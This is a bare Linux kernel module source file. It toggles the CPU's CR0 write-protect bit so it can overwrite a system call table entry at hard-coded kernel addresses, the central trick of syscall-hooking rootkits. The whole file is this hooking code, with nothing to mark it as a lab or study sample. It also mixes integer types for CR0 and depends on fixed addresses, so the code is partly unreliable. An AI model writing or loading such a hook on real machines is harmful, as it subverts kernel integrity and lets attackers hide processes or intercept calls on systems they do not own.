#include <asm/ftrace.h>
#include <asm/uaccess.h>
#include <linux/fs.h>
#include <linux/idr.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/syscalls.h>

void enable_wp(void) {
  unsigned int cr0;

  preempt_disable();
  cr0 = read_cr0();
  set_bit(X86_CR0_WP_BIT, &cr0);
  write_cr0(cr0);
  preempt_enable();
  return;
}

void disable_wp(void) {
  unsigned long cr0;

  preempt_disable();
  cr0 = read_cr0();
  clear_bit(X86_CR0_WP_BIT, &cr0);
  write_cr0(cr0);
  preempt_enable();

  return;
}

int start_module(void) {
  unsigned int *sct = 0xc15fa020;
  disable_wp();
  *(sct + 20) = 0xc1158d70;
  enable_wp();
  return 0;
}

void exit_module(void) { return; }

module_init(start_module);
module_exit(exit_module);
